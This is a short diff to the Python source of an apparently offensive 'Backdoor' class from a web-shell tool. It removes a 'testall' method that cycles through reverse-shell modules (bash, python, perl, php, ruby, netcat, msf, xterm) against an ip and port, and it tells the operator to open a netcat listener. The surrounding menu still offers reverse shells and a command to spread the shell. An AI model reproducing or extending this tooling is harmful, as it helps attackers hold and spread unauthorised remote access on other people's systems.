@@ -33,7 +33,6 @@ class Backdoor(object):
         print '[i] \t*python \t\tUse python to create a reverse shell'
         print '[i] \t*ruby   \t\tUse ruby to create a reverse shell'
         print '[i] \tspread  \t\tSpread this shell around'
-        print '[i] \ttest all\t\tTest all the backdoors'
         #print '[i] \t*xterm  \t\tUse xterm to create a reverse shell'
 
     def bash(self, ip, port):
@@ -288,21 +287,5 @@ class Backdoor(object):
             cprint('[+] Done!', 'blue')
         else:
             cprint('\n[!] Didn\'t find xterm on the remote system', 'red')
-
-    def testall(self, ip, port):
-        modules = [self.ruby, self.python, self.php_cli, self.xterm, self.perl, self.bash, self.msf, self.netcat]
-        print 'This module will test all the Backdoors in a random order until you get a conection on netcat.'
-        msg = colored('\n[i] Make sure: \'{0}\' has a listener shell setup on port: \'{1}\'', 'green')
-        msg += ' (hint: python webhandler.py -l {1} OR nc -lvvp {1})'
-        msg += colored('\n[?] Press <return> when ready!', 'yellow')
-        raw_input(msg.format(ip, port))
-        for i in xrange(1, len(modules) + 1):
-            call = random.choice(modules)
-            try:
-                modules.remove(call)
-                call(ip, port)
-            except:
-                pass
-            print "-------------------------------------------------"
 
 backdoor = Backdoor()
